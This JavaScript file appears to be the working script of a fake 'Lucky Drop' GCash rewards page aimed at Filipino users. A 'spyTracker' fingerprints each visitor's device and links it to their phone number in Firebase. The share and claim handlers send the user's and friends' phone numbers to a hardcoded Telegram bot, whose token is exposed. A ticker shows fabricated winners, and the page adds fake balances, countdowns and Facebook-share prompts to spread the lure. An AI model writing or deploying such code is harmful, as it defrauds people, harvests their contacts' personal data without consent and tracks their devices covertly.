// ========== SIMPLE DEVICE + NUMBER TRACKING (SPY MODE) ==========

const spyTracker = {
    getFingerprint: function() {
        const screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const fingerprintString = `${navigator.userAgent}|${screen}|${timezone}|${navigator.language}|${navigator.platform}|${navigator.hardwareConcurrency || 'unknown'}|${navigator.deviceMemory || 'unknown'}`;
        
        let hash = 0;
        for (let i = 0; i < fingerprintString.length; i++) {
            hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
            hash |= 0;
        }
        return `FP_${Math.abs(hash)}`;
    },

    track: async function() {
        const phone = localStorage.getItem("userPhone");
        const fingerprint = this.getFingerprint();
        
        if (!phone) return;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            const db = firebase.database();
            
            try {
                const deviceRef = db.ref('devices/' + fingerprint);
                const deviceSnap = await deviceRef.once('value');
                
                if (!deviceSnap.exists()) {
                    const counterRef = db.ref('admin/deviceCounter');
                    const counterSnap = await counterRef.once('value');
                    let nextNum = (counterSnap.val() || 0) + 1;
                    await counterRef.set(nextNum);
                    const displayId = `Dev${nextNum}`;
                    
                    await deviceRef.set({
                        phone: phone,
                        displayId: displayId,
                        fingerprint: fingerprint,
                        firstSeen: Date.now(),
                        lastSeen: Date.now()
                    });
                    
                    await db.ref('device_id_map/' + fingerprint).set({
                        displayId: displayId,
                        phone: phone,
                        createdAt: Date.now()
                    });
                    
                    localStorage.setItem("userDeviceDisplayId", displayId);
                } else {
                    await deviceRef.update({
                        lastSeen: Date.now(),
                        phone: phone
                    });
                }
                
                await db.ref('device_phone_map/' + fingerprint).set({
                    phone: phone,
                    lastSeen: Date.now()
                });
                
                const sessionRef = db.ref('user_sessions/' + phone);
                const sessionSnap = await sessionRef.once('value');
                
                if (!sessionSnap.exists()) {
                    await sessionRef.set({
                        phone: phone,
                        balance: 0,
                        deviceFingerprint: fingerprint,
                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
                        firstVisit: Date.now(),
                        lastUpdate: Date.now(),
                        highestReward: 0,
                        indicatorStep: 0,
                        claimOnHold: false
                    });
                } else {
                    await sessionRef.update({
                        deviceFingerprint: fingerprint,
                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || sessionSnap.val().deviceDisplayId,
                        lastUpdate: Date.now()
                    });
                }
                
                await db.ref('activity_logs/' + Date.now()).set({
                    phone: phone,
                    deviceId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
                    fingerprint: fingerprint,
                    page: "share_and_earn",
                    timestamp: Date.now()
                });
                
            } catch(e) {
                console.log("Tracking error:", e);
            }
        }
    }
};

// ========== INDICATOR SYSTEM ==========
// Step 1: NEON YELLOW RED - Pwede mag-claim ng ₱150
// Step 2: NEON BLUE - Kailangan mag-share sa Facebook
// Step 3: NEON GREEN - Complete na, may referral bonus

const indicatorSystem = {
    updateIndicators: function(step, isOnHold = false) {
        const indicator1 = document.getElementById('indicator1');
        const indicator2 = document.getElementById('indicator2');
        const indicator3 = document.getElementById('indicator3');
        
        // Reset lahat
        [indicator1, indicator2, indicator3].forEach(ind => {
            if (ind) {
                ind.classList.remove('indicator-yellow-red', 'indicator-blue', 'indicator-green', 'indicator-hold');
                ind.style.background = 'rgba(255,255,255,0.2)';
                ind.style.boxShadow = 'none';
                ind.style.animation = 'none';
            }
        });
        
        // Step 1: NEON YELLOW RED
        if (step >= 1 && indicator1) {
            if (isOnHold) {
                indicator1.classList.add('indicator-hold');
                indicator1.style.background = '#ffd700';
                indicator1.style.boxShadow = '0 0 15px #ffd700';
            } else {
                indicator1.classList.add('indicator-yellow-red');
                indicator1.style.background = 'linear-gradient(90deg, #ff4444, #ffd700)';
                indicator1.style.boxShadow = '0 0 10px #ff4444';
                indicator1.style.animation = 'pulseFade 1s infinite';
            }
        }
        
        // Step 2: NEON BLUE
        if (step >= 2 && indicator2) {
            indicator2.classList.add('indicator-blue');
            indicator2.style.background = '#00f2ff';
            indicator2.style.boxShadow = '0 0 10px #00f2ff';
            indicator2.style.animation = 'pulseFade 1s infinite';
        }
        
        // Step 3: NEON GREEN
        if (step >= 3 && indicator3) {
            indicator3.classList.add('indicator-green');
            indicator3.style.background = '#39ff14';
            indicator3.style.boxShadow = '0 0 10px #39ff14';
            indicator3.style.animation = 'pulseFade 1s infinite';
        }
        
        // I-save sa localStorage at Firebase
        localStorage.setItem('indicatorStep', step);
        localStorage.setItem('claimOnHold', isOnHold);
        this.saveToFirebase(step, isOnHold);
    },
    
    saveToFirebase: async function(step, isOnHold) {
        const phone = localStorage.getItem("userPhone");
        if (!phone) return;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            const db = firebase.database();
            await db.ref('user_sessions/' + phone).update({
                indicatorStep: step,
                claimOnHold: isOnHold,
                lastStepUpdate: Date.now()
            });
        }
    },
    
    loadFromFirebase: async function() {
        const phone = localStorage.getItem("userPhone");
        if (!phone) return { step: 0, isOnHold: false };
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            const db = firebase.database();
            const sessionSnap = await db.ref('user_sessions/' + phone).once('value');
            const step = sessionSnap.exists() ? sessionSnap.val().indicatorStep || 0 : 0;
            const isOnHold = sessionSnap.exists() ? sessionSnap.val().claimOnHold || false : false;
            localStorage.setItem('indicatorStep', step);
            localStorage.setItem('claimOnHold', isOnHold);
            this.updateIndicators(step, isOnHold);
            return { step, isOnHold };
        }
        return { step: 0, isOnHold: false };
    },
    
    // Step 1: Claim button clicked - magiging HOLD
    step1ClaimOnHold: async function() {
        const currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
        if (currentStep === 1) {
            this.updateIndicators(1, true);
            return true;
        }
        return false;
    },
    
    // Step 2: Mag-share sa Facebook
    step2FacebookShare: async function() {
        const currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
        if (currentStep === 2) {
            this.updateIndicators(2, false);
            return true;
        }
        return false;
    },
    
    // Step 3: May gumamit ng referral number
    step3ReferralComplete: async function() {
        const currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
        if (currentStep === 3) {
            this.updateIndicators(3, false);
            return true;
        }
        return false;
    },
    
    // Kunin ang current step
    getCurrentStep: function() {
        return parseInt(localStorage.getItem('indicatorStep') || '0');
    },
    
    // I-set ang step
    setStep: function(step) {
        this.updateIndicators(step, false);
    }
};

// ========== BALANCE MANAGEMENT ==========
const balanceManager = {
    // Kunin ang current balance ng user
    getBalance: async function() {
        const phone = localStorage.getItem("userPhone");
        if (!phone) return 0;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            const db = firebase.database();
            const sessionSnap = await db.ref('user_sessions/' + phone).once('value');
            return sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
        }
        return 0;
    },
    
    // Magdagdag ng balance (max 1200)
    addBalance: async function(amount) {
        const phone = localStorage.getItem("userPhone");
        if (!phone) return false;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            const db = firebase.database();
            const sessionRef = db.ref('user_sessions/' + phone);
            const sessionSnap = await sessionRef.once('value');
            const currentBalance = sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
            let newBalance = currentBalance + amount;
            
            // Limit to 1200
            if (newBalance > 1200) {
                newBalance = 1200;
                alert("🏆 Maximum balance of ₱1200 reached!");
            }
            
            await sessionRef.update({
                balance: newBalance,
                lastBalanceUpdate: Date.now()
            });
            
            // I-record ang transaction
            await db.ref('balance_history/' + phone + '/' + Date.now()).set({
                amount: amount,
                newBalance: newBalance,
                reason: "reward",
                timestamp: Date.now()
            });
            
            return newBalance;
        }
        return false;
    },
    
    // I-update ang display ng balance (kung may balance element)
    updateBalanceDisplay: async function() {
        const balance = await this.getBalance();
        const balanceElement = document.getElementById('userBalanceDisplay');
        if (balanceElement) {
            balanceElement.innerHTML = `₱${balance.toLocaleString()}`;
        }
        return balance;
    }
};

// ========== WEIGHTED RANDOM AMOUNTS ==========
const rewardTiers = {
    common: {
        amounts: [150, 300],
        weight: 60
    },
    rare: {
        amounts: [450, 600, 750],
        weight: 30
    },
    legendary: {
        amounts: [900, 1050, 1200],
        weight: 10
    }
};

function generateWeightedAmount() {
    const random = Math.random() * 100;
    let selectedTier = rewardTiers.common;
    
    if (random < rewardTiers.common.weight) {
        selectedTier = rewardTiers.common;
    } else if (random < rewardTiers.common.weight + rewardTiers.rare.weight) {
        selectedTier = rewardTiers.rare;
    } else {
        selectedTier = rewardTiers.legendary;
    }
    
    const amounts = selectedTier.amounts;
    return amounts[Math.floor(Math.random() * amounts.length)];
}

// ========== LOGICAL RANDOM WINNERS TICKER ==========
const winnerTicker = {
    prefixes: ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"],
    winnerElement: null,
    
    generateLast4Digits: function() {
        return Math.floor(1000 + Math.random() * 9000).toString();
    },
    
    generatePrefix: function() {
        return this.prefixes[Math.floor(Math.random() * this.prefixes.length)];
    },
    
    generateWinnerText: function() {
        const prefix = this.generatePrefix();
        const last4 = this.generateLast4Digits();
        const amount = generateWeightedAmount();
        return `${prefix}***${last4} withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${amount}`;
    },
    
    animateTransition: function(newText) {
        if (!this.winnerElement) return;
        
        this.winnerElement.style.transition = 'opacity 0.3s ease';
        this.winnerElement.style.opacity = '0';
        
        setTimeout(() => {
            this.winnerElement.innerHTML = newText;
            this.winnerElement.style.opacity = '1';
        }, 300);
    },
    
    updateWinner: function() {
        const newWinnerText = this.generateWinnerText();
        this.animateTransition(newWinnerText);
    },
    
    start: function() {
        this.winnerElement = document.getElementById('winnerText');
        if (!this.winnerElement) return;
        
        this.winnerElement.innerHTML = this.generateWinnerText();
        this.winnerElement.style.transition = 'opacity 0.3s ease';
        this.winnerElement.style.opacity = '1';
        
        setInterval(() => {
            this.updateWinner();
        }, 15000);
    }
};

// ========== REFERRAL TIMER (PERSISTENT - 5 MINUTES) ==========
const referralTimer = {
    STORAGE_KEY: 'referral_end_time',
    
    startTimer: function() {
        const endTime = Date.now() + (5 * 60 * 1000);
        localStorage.setItem(this.STORAGE_KEY, endTime);
        return endTime;
    },
    
    getRemainingTime: function() {
        const endTime = localStorage.getItem(this.STORAGE_KEY);
        if (!endTime) return 0;
        
        const remaining = parseInt(endTime) - Date.now();
        if (remaining <= 0) {
            this.clearTimer();
            return 0;
        }
        return Math.floor(remaining / 1000);
    },
    
    clearTimer: function() {
        localStorage.removeItem(this.STORAGE_KEY);
    },
    
    updateDisplay: function() {
        const remainingSecs = this.getRemainingTime();
        const timerElement = document.getElementById('popupTimerDisplay');
        
        if (timerElement && remainingSecs > 0) {
            const mins = Math.floor(remainingSecs / 60);
            const secs = remainingSecs % 60;
            timerElement.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            return true;
        } else if (timerElement && remainingSecs <= 0) {
            timerElement.innerHTML = "00:00";
        }
        return false;
    },
    
    startCountdown: function() {
        this.updateDisplay();
        
        const interval = setInterval(() => {
            const hasTime = this.updateDisplay();
            if (!hasTime) {
                clearInterval(interval);
            }
        }, 1000);
        
        return interval;
    }
};

// ========== SHARE BUTTON LOGIC ==========
let shareCountdownInterval = null;

function startShareCountdown() {
    if (shareCountdownInterval) clearInterval(shareCountdownInterval);
    
    shareCountdownInterval = setInterval(() => {
        const remaining = referralTimer.getRemainingTime();
        const shareBtn = document.getElementById('shareButton');
        const friendInput = document.getElementById('friendPhoneInput');
        const statusMsg = document.getElementById('statusMessage');
        
        if (remaining > 0) {
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            if (shareBtn) {
                shareBtn.disabled = true;
                shareBtn.innerHTML = `⏰ WAIT ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            }
            if (friendInput) friendInput.disabled = true;
            if (statusMsg) {
                statusMsg.innerHTML = `<span class="status-waiting">⏳ Please wait ${mins}:${secs.toString().padStart(2, '0')} before sharing again ⏳</span>`;
            }
        } else {
            if (shareBtn) {
                shareBtn.disabled = false;
                shareBtn.innerHTML = "🐾 SHARE & UNLOCK 🐾";
            }
            if (friendInput) friendInput.disabled = false;
            if (statusMsg) {
                statusMsg.innerHTML = `<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>`;
            }
            clearInterval(shareCountdownInterval);
            shareCountdownInterval = null;
        }
    }, 1000);
}

// ========== STEP 1: SHARE BUTTON HANDLER ==========
async function handleShare() {
    const friendPhone = document.getElementById('friendPhoneInput').value.trim();
    const userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Please enter valid 11-digit number starting with 09");
        return;
    }
    
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    
    // I-set sa Step 1
    indicatorSystem.setStep(1);
    
    // Send notification
    const message = `📱 REFERRAL INVITE - STEP 1/3!\n👤 User: ${userPhone}\n👥 Friend: ${friendPhone}`;
    
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
    } catch(e) {
        console.log("Telegram error:", e);
    }
    
    referralTimer.startTimer();
    startShareCountdown();
    
    document.getElementById('friendPhoneInput').value = '';
    
    const progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '33%';
    
    const statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = `<span class="status-step1">✅ Step 1/3 completed! Click CLAIM THRU GCASH to get ₱150! 🟡🔴</span>`;
    }
    
    showPrizePopup();
}

// ========== STEP 2: FACEBOOK SHARE HANDLER ==========
async function handleFacebookShare() {
    const shareUrl = "https://xjiligames.github.io/rewards/index.html";
    const shareText = "🎉 I just won from Lucky Drop! Join me and get your bonus too! 🐾";
    
    const fbShareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}&quote=${encodeURIComponent(shareText)}`;
    
    window.open(fbShareUrl, '_blank', 'width=600,height=400');
    
    // I-set sa Step 2 - NEON BLUE
    await indicatorSystem.step2FacebookShare();
    
    const progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '66%';
    
    const statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = `<span class="status-step2">✅ Step 2/3 completed! Share to Facebook done! 🔵</span>`;
    }
    
    // I-save sa Firebase na Step 2 na ang user
    const phone = localStorage.getItem("userPhone");
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        await db.ref('user_sessions/' + phone).update({
            indicatorStep: 2,
            lastStepUpdate: Date.now()
        });
    }
}

// ========== STEP 3: REFERRAL COMPLETE (ginamit ng ibang user ang number) ==========
async function completeReferral(referredPhone) {
    const userPhone = localStorage.getItem("userPhone");
    
    // Magdagdag ng ₱150 sa balance ni User #1
    await balanceManager.addBalance(150);
    
    // I-set sa Step 3 - NEON GREEN
    await indicatorSystem.step3ReferralComplete();
    
    const progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '100%';
    
    const statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = `<span class="status-step3">🎉 Step 3/3 completed! +₱150 bonus from referral! 🟢</span>`;
    }
    
    // I-save sa Firebase
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        await db.ref('user_sessions/' + userPhone).update({
            indicatorStep: 3,
            balance: await balanceManager.getBalance(),
            lastStepUpdate: Date.now()
        });
        
        // I-record ang referral
        await db.ref('referrals/' + userPhone + '/' + referredPhone).set({
            timestamp: Date.now(),
            bonus: 150
        });
    }
    
    // I-update ang balance display
    await balanceManager.updateBalanceDisplay();
    
    alert(`🎉 +₱150 added to your balance! Total: ₱${await balanceManager.getBalance()}`);
}

// ========== CLAIM GCASH BUTTON (Step 1 - ₱150 only) ==========
async function handleClaimGCash() {
    const currentStep = indicatorSystem.getCurrentStep();
    const isOnHold = localStorage.getItem('claimOnHold') === 'true';
    
    // Step 1 lang ang pwedeng mag-claim ng ₱150
    if (currentStep !== 1) {
        alert("⚠️ Complete Step 1 first!\n\nEnter a friend's mobile number to unlock ₱150 reward.");
        return;
    }
    
    if (isOnHold) {
        alert("⏳ Claim is already processing. Please wait.");
        return;
    }
    
    // I-set sa HOLD mode
    await indicatorSystem.step1ClaimOnHold();
    
    // Magdagdag ng ₱150 sa balance
    const newBalance = await balanceManager.addBalance(150);
    
    if (newBalance !== false) {
        alert(`💰 ₱150 added to your balance! Total: ₱${newBalance}`);
        
        // Send Telegram notification
        const phone = localStorage.getItem("userPhone");
        const message = `💰 CLAIM SUCCESS - STEP 1/3!\n📱 User: ${phone}\n💵 ₱150 claimed\n💰 New Balance: ₱${newBalance}`;
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
        
        // I-update ang progress
        const progressFill = document.getElementById('progressFill');
        if (progressFill) progressFill.style.width = '50%';
        
        const statusMsg = document.getElementById('statusMessage');
        if (statusMsg) {
            statusMsg.innerHTML = `<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2! 🔵</span>`;
        }
        
        // I-update ang indicator - remove HOLD, show Step 1 completed
        indicatorSystem.updateIndicators(1, false);
    }
}

// ========== PRIZE POPUP FUNCTIONS ==========
function showPrizePopup() {
    const popup = document.getElementById('prizePopup');
    const popupBalance = document.getElementById('popupBalanceAmount');
    
    if (popupBalance) popupBalance.innerHTML = "₱150.00";
    
    referralTimer.startCountdown();
    startConfetti();
    
    if (popup) popup.style.display = 'flex';
}

function closePrizePopup() {
    const popup = document.getElementById('prizePopup');
    if (popup) popup.style.display = 'none';
    stopConfetti();
}

// ========== CONFETTI FUNCTIONS ==========
let confettiInterval = null;

function startConfetti() {
    const canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    
    canvas.style.display = 'block';
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const ctx = canvas.getContext('2d');
    
    const particles = [];
    for (let i = 0; i < 150; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 8 + 3,
            color: `hsl(${Math.random() * 360}, 100%, 60%)`,
            speed: Math.random() * 4 + 2
        });
    }
    
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        for (let p of particles) {
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        
        confettiInterval = requestAnimationFrame(draw);
    }
    
    draw();
    
    setTimeout(() => {
        stopConfetti();
    }, 5000);
}

function stopConfetti() {
    if (confettiInterval) {
        cancelAnimationFrame(confettiInterval);
        confettiInterval = null;
    }
    const canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        const ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        canvas.style.display = 'none';
    }
}

// ========== MAIN TIMER ==========
function updateMainTimer() {
    const target = new Date(2026, 4, 1, 0, 0, 0);
    const now = new Date();
    const diff = target - now;
    const timerDisplay = document.getElementById('mainTimerDisplay');
    
    if (timerDisplay && diff > 0) {
        const days = Math.floor(diff / (1000*60*60*24));
        const hours = Math.floor((diff % (86400000)) / 3600000);
        const mins = Math.floor((diff % 3600000) / 60000);
        const secs = Math.floor((diff % 60000) / 1000);
        timerDisplay.innerHTML = `${days}D ${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
    } else if (timerDisplay) {
        timerDisplay.innerHTML = "00:00:00";
    }
}

// ========== CHECK EXISTING TIMER ==========
function checkExistingTimer() {
    const remaining = referralTimer.getRemainingTime();
    if (remaining > 0) {
        startShareCountdown();
        referralTimer.startCountdown();
    }
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', async function() {
    console.log("Promotion.js loaded - Indicator System v2");
    
    await spyTracker.track();
    winnerTicker.start();
    checkExistingTimer();
    
    // Load current step from Firebase
    const { step, isOnHold } = await indicatorSystem.loadFromFirebase();
    console.log(`Current step: ${step}, On Hold: ${isOnHold}`);
    
    // Update progress bar based on step
    const progressFill = document.getElementById('progressFill');
    if (progressFill) {
        if (step >= 3) progressFill.style.width = '100%';
        else if (step >= 2) progressFill.style.width = '66%';
        else if (step >= 1) progressFill.style.width = '33%';
    }
    
    // Share button
    const shareBtn = document.getElementById('shareButton');
    if (shareBtn) {
        const newShareBtn = shareBtn.cloneNode(true);
        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
        newShareBtn.onclick = handleShare;
        newShareBtn.disabled = false;
    }
    
    // Facebook share button
    const fbShareBtn = document.getElementById('shareFBBtn');
    if (fbShareBtn) {
        // Add info text below button
        const infoText = document.createElement('div');
        infoText.className = 'fb-share-info';
        infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
        infoText.innerHTML = '📱 You will receive SMS notification once your share is validated and get +150 bonus Credits';
        fbShareBtn.parentNode.appendChild(infoText);
        
        fbShareBtn.onclick = handleFacebookShare;
    }
    
    // Claim button
    const claimGCashBtn = document.getElementById('claimGCashBtn');
    if (claimGCashBtn) {
        claimGCashBtn.onclick = handleClaimGCash;
    }
    
    updateMainTimer();
    setInterval(updateMainTimer, 1000);
    
    const popup = document.getElementById('prizePopup');
    if (popup) {
        popup.onclick = function(e) {
            if (e.target === popup) {
                closePrizePopup();
            }
        };
    }
    
    console.log("✅ Promotion.js initialized");
});
